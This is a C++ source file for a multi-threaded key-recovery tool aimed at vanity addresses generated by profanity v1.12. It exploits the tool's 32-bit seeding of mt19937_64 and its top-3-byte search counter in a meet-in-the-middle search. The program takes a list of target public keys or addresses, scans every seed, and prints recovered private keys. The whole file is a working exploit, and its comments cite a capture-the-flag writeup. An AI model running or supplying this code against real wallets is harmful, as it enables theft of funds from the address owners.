// recover_mt.cpp - multi-target MITM against profanity v1.12 (top-3-byte counter).
//
// Structure (from johguse/profanity Dispatcher.cpp + kernel profanity_init, and the official
// Hackergame-2022 writeup): createSeed() = 4x uint64 from std::mt19937_64 seeded with ONE 32-bit
// std::random_device draw; the printed address is the base advanced by the search counter, and
// v1.12 moves the TOP 3 BYTES of the key -> key = base + idx*2^232, idx in [-(2^24-1), 2^24-1].
//
// MITM: table = union over targets of pubkey(T + idx*2^232); scan every 32-bit seed, one pubkey
// each, look up.  A hit yields (target, seed, idx) -> privkey = base(seed) - idx*2^232.
// ONE 2^32 pass tests the WHOLE batch: the table carries target_id.
//
// Build:  c++ -O3 -std=c++17 -march=native recover_mt.cpp -o recover_mt -lsecp256k1 -lpthread
// Usage:  recover_mt <targets> [--lo N] [--hi N] [--threads N] [--out F] [--mem-cap-mb N]
//         targets: text file, one per line, either "<pubkey_hex> [addr]" or the get_pubkeys.py
//                  JSONL ({"addr":..,"pubkey":..}).
#include <secp256k1.h>
#include <atomic>
#include <thread>
#include <vector>
#include <algorithm>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <fstream>
#include <sstream>
#include <random>

// --- libsecp256k1 API shim: 0.2.0+ dropped the ctx argument from the pubkey fns --------
#ifdef SK_MODERN
static inline int SK_parse(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* in, size_t n){ (void)c; return secp256k1_ec_pubkey_parse(p, in, n); }
static inline int SK_ser(secp256k1_context* c, unsigned char* o, size_t* n, const secp256k1_pubkey* p, unsigned f){ (void)c; return secp256k1_ec_pubkey_serialize(o, n, p, f); }
static inline int SK_create(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* s){ (void)c; return secp256k1_ec_pubkey_create(p, s); }
static inline int SK_neg(secp256k1_context* c, secp256k1_pubkey* p){ (void)c; return secp256k1_ec_pubkey_negate(p); }
static inline int SK_tadd(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* t){ (void)c; return secp256k1_ec_pubkey_tweak_add(p, t); }
#else
static inline int SK_parse(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* in, size_t n){ return secp256k1_ec_pubkey_parse(c, p, in, n); }
static inline int SK_ser(secp256k1_context* c, unsigned char* o, size_t* n, const secp256k1_pubkey* p, unsigned f){ return secp256k1_ec_pubkey_serialize(c, o, n, p, f); }
static inline int SK_create(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* s){ return secp256k1_ec_pubkey_create(c, p, s); }
static inline int SK_neg(secp256k1_context* c, secp256k1_pubkey* p){ return secp256k1_ec_pubkey_negate(c, p); }
static inline int SK_tadd(secp256k1_context* c, secp256k1_pubkey* p, const unsigned char* t){ return secp256k1_ec_pubkey_tweak_add(c, p, t); }
#endif

static inline int SK_combine(secp256k1_context* c, secp256k1_pubkey* o, const secp256k1_pubkey** ins, size_t n) {
#ifdef SK_MODERN
    (void)c; return secp256k1_ec_pubkey_combine(o, (const secp256k1_pubkey* const*)ins, n);
#else
    return secp256k1_ec_pubkey_combine(c, o, (const secp256k1_pubkey* const*)ins, n);
#endif
}

static const int32_t HALF = 0xFFFFFF;                 // idx in [-HALF, HALF]  (v1.12 range)
static const uint32_t HALF_U = (uint32_t)HALF;

struct __attribute__((packed)) Ent { uint64_t h; uint32_t meta; };   // 12 bytes
// meta = (tid << 25) | (idx + 2^24)   ; idx+2^24 in [1, 2^25-1] ; tid < 128
static inline uint32_t pack_meta(int tid, int32_t idx) {
    return ((uint32_t)tid << 25) | (uint32_t)(idx + (int32_t)(1 << 24));
}
static inline int unpack_tid(uint32_t m) { return (int)(m >> 25); }
static inline int32_t unpack_idx(uint32_t m) { return (int32_t)(m & 0x1FFFFFFu) - (1 << 24); }

struct Target { std::string addr; unsigned char pub[65]; size_t publen; };

static std::vector<Target> T;
static std::vector<Ent> TABLE;
static std::vector<unsigned char> TSER;      // N*33 compressed target pubs (for verify)
static std::atomic<int> FOUND{0};
static std::atomic<uint64_t> SCANNED{0};
static FILE* OUT = nullptr;

static void be23(unsigned char* out, int32_t v) {      // 32 BE bytes = v * 2^232
    memset(out, 0, 32);
    out[0] = (unsigned char)((v >> 16) & 0xFF);
    out[1] = (unsigned char)((v >> 8) & 0xFF);
    out[2] = (unsigned char)(v & 0xFF);
}
// curve order n (big-endian); n - a*2^232 == negated tweak scalar so tweak_add(target) = target - a*2^232
static const unsigned char SECP_N[32] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,
    0xBA,0xAE,0xDC,0xE6,0xAF,0x48,0xA0,0x3B,0xBF,0xD2,0x5E,0x8C,0xD0,0x36,0x41,0x41};
static void be23neg(unsigned char* out, int32_t a) {   // 32 BE bytes = n - a*2^232
    memcpy(out, SECP_N, 32);
    uint32_t hi = 0xFFFFFFu - (uint32_t)a;             // a*2^232 lands in bytes 0..2; no borrow past byte 2
    out[0] = (unsigned char)((hi >> 16) & 0xFF);
    out[1] = (unsigned char)((hi >> 8) & 0xFF);
    out[2] = (unsigned char)(hi & 0xFF);
}

static bool load_targets(const char* path) {
    std::ifstream f(path);
    if (!f) { fprintf(stderr, "cannot open %s\n", path); return false; }
    std::string line;
    while (std::getline(f, line)) {
        if (line.empty()) continue;
        std::string hex, addr;
        if (line[0] == '{') {                           // JSONL from get_pubkeys.py
            size_t a = line.find("\"addr\""), p = line.find("\"pubkey\"");
            if (p == std::string::npos) continue;
            size_t q1 = line.find('"', line.find(':', p) + 1);
            size_t q2 = line.find('"', q1 + 1);
            hex = line.substr(q1 + 1, q2 - q1 - 1);
            if (a != std::string::npos) {
                size_t r1 = line.find('"', line.find(':', a) + 1);
                size_t r2 = line.find('"', r1 + 1);
                addr = line.substr(r1 + 1, r2 - r1 - 1);
            }
        } else {
            std::istringstream is(line);
            is >> hex >> addr;
        }
        if (hex.rfind("0x", 0) == 0) hex = hex.substr(2);
        size_t nbytes = hex.size() / 2;
        if (nbytes != 64 && nbytes != 65) { fprintf(stderr, "skip %s (len %zu)\n", hex.c_str(), nbytes); continue; }
        Target t; t.addr = addr.empty() ? std::string("?") : addr; t.publen = nbytes;
        if (nbytes == 64) { t.pub[0] = 0x04; for (size_t i = 0; i < 64; i++) t.pub[1 + i] = (unsigned char)strtoul(hex.substr(2 * i, 2).c_str(), 0, 16); t.publen = 65; }
        else { for (size_t i = 0; i < 65; i++) t.pub[i] = (unsigned char)strtoul(hex.substr(2 * i, 2).c_str(), 0, 16); }
        T.push_back(t);
    }
    return !T.empty();
}

static void build_table(int nthreads) {
    size_t per = (size_t)(2 * (int64_t)HALF + 1);
    size_t total = per * T.size();
    fprintf(stderr, "building table: %zu targets x %zu = %zu entries (%.2f GB)\n",
            T.size(), per, total, (double)total * sizeof(Ent) / 1e9);
    TABLE.resize(total);
    secp256k1_context* ctx0 = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    std::vector<secp256k1_pubkey> base(T.size());
    for (size_t k = 0; k < T.size(); k++)
        if (!SK_parse(ctx0, &base[k], T[k].pub, T[k].publen)) {
            fprintf(stderr, "bad pubkey %zu\n", k); exit(1);
        }
    {
        secp256k1_context* cx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
        TSER.assign(T.size() * 33, 0);
        for (size_t k = 0; k < T.size(); k++) { size_t sn = 33;
            SK_ser(cx, &TSER[k * 33], &sn, &base[k], SECP256K1_EC_COMPRESSED); }
        secp256k1_context_destroy(cx);
    }
    secp256k1_context_destroy(ctx0);
    // COUNTER SERIES by point ADDITION (not per-target mults): Q = (1<<232)*G,
    //   dir=+1: R_w = T + w*Q  -> idx = +w   ; dir=-1: R_w = T - w*Q -> idx = -w
    // 2 additions-series per target; ~2*HALF additions/target total. 2*N tasks.
    unsigned char qs[32]; memset(qs, 0, 32); qs[2] = 0x01;   // 1 << 232, big-endian
    std::atomic<size_t> next{0};
    std::atomic<size_t> done{0};
    const size_t NT = T.size() * 2;
    auto worker = [&]() {
        secp256k1_context* c = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
        secp256k1_pubkey Q; SK_create(c, &Q, qs);
        secp256k1_pubkey Qneg = Q; SK_neg(c, &Qneg);
        auto emit = [&](size_t k, int32_t idx, const secp256k1_pubkey* R) {
            unsigned char sb[33]; size_t sn = 33;
            SK_ser(c, sb, &sn, R, SECP256K1_EC_COMPRESSED);
            uint64_t h; memcpy(&h, sb + 25, 8);
            TABLE[(size_t)k * per + (size_t)(idx + HALF)] = Ent{h, pack_meta((int)k, idx)};
        };
        size_t task;
        while ((task = next.fetch_add(1)) < NT) {
            size_t k = task / 2; int dir = (task % 2) ? -1 : +1;
            secp256k1_pubkey R = base[k], tmp;
            const secp256k1_pubkey* ins[2] = {&R, dir > 0 ? &Q : &Qneg};
            if (dir > 0) {
                emit(k, 0, &R);
                for (int32_t w = 1; w <= HALF; w++) { SK_combine(c, &tmp, ins, 2); R = tmp; emit(k, w, &R); }
            } else {
                for (int32_t w = 1; w <= HALF; w++) { SK_combine(c, &tmp, ins, 2); R = tmp; emit(k, -w, &R); }
            }
            size_t d = done.fetch_add(1) + 1;
            if (d % 4 == 0 || d == NT)
                fprintf(stderr, "  table %zu/%zu series\n", d, NT);
        }
        secp256k1_context_destroy(c);
    };
    std::vector<std::thread> ts;
    for (int i = 0; i < nthreads; i++) ts.emplace_back(worker);
    for (auto& th : ts) th.join();
    fprintf(stderr, "sorting...\n");
    std::sort(TABLE.begin(), TABLE.end(), [](const Ent& a, const Ent& b) { return a.h < b.h; });
    fprintf(stderr, "table ready\n");
}

int main(int argc, char** argv) {
    if (argc < 2) { fprintf(stderr, "usage: recover_mt <targets> [--lo N] [--hi N] [--threads N] [--out F]\n"); return 1; }
    uint64_t lo = 0, hi = 1ULL << 32;
    int nthreads = (int)std::thread::hardware_concurrency();
    std::string out;
    for (int i = 2; i < argc; i++) {
        std::string a = argv[i];
        if (a == "--lo" && i + 1 < argc) lo = strtoull(argv[++i], 0, 0);
        else if (a == "--hi" && i + 1 < argc) hi = strtoull(argv[++i], 0, 0);
        else if (a == "--threads" && i + 1 < argc) nthreads = atoi(argv[++i]);
        else if (a == "--out" && i + 1 < argc) out = argv[++i];
    }
    if (!load_targets(argv[1])) return 1;
    fprintf(stderr, "%zu targets\n", T.size());
    OUT = out.empty() ? stdout : fopen(out.c_str(), "a");
    build_table(nthreads);
    fprintf(stderr, "scanning seeds [%llu,%llu) on %d threads...\n",
            (unsigned long long)lo, (unsigned long long)hi, nthreads);

    auto t0 = std::chrono::steady_clock::now();
    std::atomic<uint64_t> nextlo{lo};
    auto scan = [&]() {
        secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
        uint64_t local = 0;
        std::uniform_int_distribution<uint64_t> distr;
        for (;;) {
            uint64_t s = nextlo.fetch_add(1);
            if (s >= hi) break;
            std::mt19937_64 eng(s);
            uint64_t sk[4];
            for (int i = 0; i < 4; i++) sk[i] = distr(eng);
            unsigned char sec[32];
            for (int i = 0; i < 4; i++) { uint64_t v = sk[3 - i]; for (int j = 0; j < 8; j++) sec[i * 8 + j] = (unsigned char)((v >> (56 - 8 * j)) & 0xFF); }
            secp256k1_pubkey p;
            if (!SK_create(ctx, &p, sec)) { if ((++local & 0x3FFFF) == 0) SCANNED.fetch_add(local), local = 0; continue; }
            unsigned char sb[33]; size_t sn = 33;
            SK_ser(ctx, sb, &sn, &p, SECP256K1_EC_COMPRESSED);
            uint64_t h; memcpy(&h, sb + 25, 8);
            static uint64_t dbg = getenv("DBGSEED") ? strtoull(getenv("DBGSEED"), 0, 10) : 0;
            if (dbg && s == dbg) {
                auto d = std::lower_bound(TABLE.begin(), TABLE.end(), h,
                    [](const Ent& e, uint64_t v) { return e.h < v; });
                fprintf(stderr, "DBG seed=%llu h=%016llx table_found_h=%d\n", (unsigned long long)s,
                        (unsigned long long)h, (d != TABLE.end() && d->h == h));
            }
            auto it = std::lower_bound(TABLE.begin(), TABLE.end(), h,
                [](const Ent& e, uint64_t v) { return e.h < v; });
            while (it != TABLE.end() && it->h == h) {
                int tid = unpack_tid(it->meta); int32_t idx = unpack_idx(it->meta);
                // key = base - idx*2^232  ==  base + d*2^232 with d = -idx (the counter profanity applied)
                uint64_t vv[4];                       // big-endian limbs, vv[0] = top
                int64_t d = -(int64_t)idx;
                uint64_t x[4] = {sk[3], sk[2], sk[1], sk[0]};   // big-endian view
                if (d >= 0) {
                    uint64_t add = (uint64_t)d << 40, carry = 0;
                    for (int i = 0; i < 4; i++) { uint64_t t = x[i] + add; carry = (t < x[i]); x[i] = t; add = carry; }
                } else {
                    uint64_t sub = (uint64_t)(-d) << 40, borrow = 0;
                    for (int i = 0; i < 4; i++) {
                        uint64_t y = (i == 0 ? sub : 0), r = x[i] - y - borrow;
                        borrow = (x[i] < y || x[i] - y < borrow); x[i] = r;
                    }
                }
                for (int i = 0; i < 4; i++) vv[i] = x[i];
                unsigned char sec2[32];
                for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) sec2[i * 8 + j] = (unsigned char)((vv[i] >> (56 - 8 * j)) & 0xFF);
                secp256k1_pubkey p2; unsigned char s2[33]; size_t n2 = 33;
                if (SK_create(ctx, &p2, sec2) &&
                    (SK_ser(ctx, s2, &n2, &p2, SECP256K1_EC_COMPRESSED), n2 == 33) &&
                    memcmp(s2, &TSER[(size_t)tid * 33], 33) == 0) {
                    char key[67];
                    for (int i = 0; i < 4; i++) sprintf(key + 16 * i, "%016llx", (unsigned long long)vv[i]);
                    char pubh[131];
                    for (int i = 0; i < 64; i++) sprintf(pubh + 2 * i, "%02x", T[tid].pub[1 + i]);
                    fprintf(OUT, "HIT target=%s addr=%s seed=%llu idx=%d privkey=0x%s pubkey=0x04%s\n",
                            std::to_string(tid).c_str(), T[tid].addr.c_str(),
                            (unsigned long long)s, idx, key, pubh);
                    fflush(OUT);
                    fprintf(stderr, "HIT tid=%d seed=%llu idx=%d\n", tid, (unsigned long long)s, idx);
                    FOUND.fetch_add(1);
                }
                ++it;
            }
            if ((++local & 0x3FFFF) == 0) { SCANNED.fetch_add(local); local = 0;
                double dt = std::chrono::duration<double>(std::chrono::steady_clock::now() - t0).count();
                fprintf(stderr, "  %.0f M keys, %.0f k/s, hits=%d\n", SCANNED.load() / 1e6, SCANNED.load() / dt / 1e3, FOUND.load());
            }
        }
        SCANNED.fetch_add(local);
        secp256k1_context_destroy(ctx);
    };
    std::vector<std::thread> ts;
    for (int i = 0; i < nthreads; i++) ts.emplace_back(scan);
    for (auto& th : ts) th.join();
    double dt = std::chrono::duration<double>(std::chrono::steady_clock::now() - t0).count();
    fprintf(stderr, "done: %llu keys in %.1fs (%.0f k/s), hits=%d\n",
            (unsigned long long)SCANNED.load(), dt, SCANNED.load() / dt / 1e3, FOUND.load());
    if (!FOUND.load()) fprintf(stderr, "no hit in [%llu,%llu)\n", (unsigned long long)lo, (unsigned long long)hi);
    return 0;
}
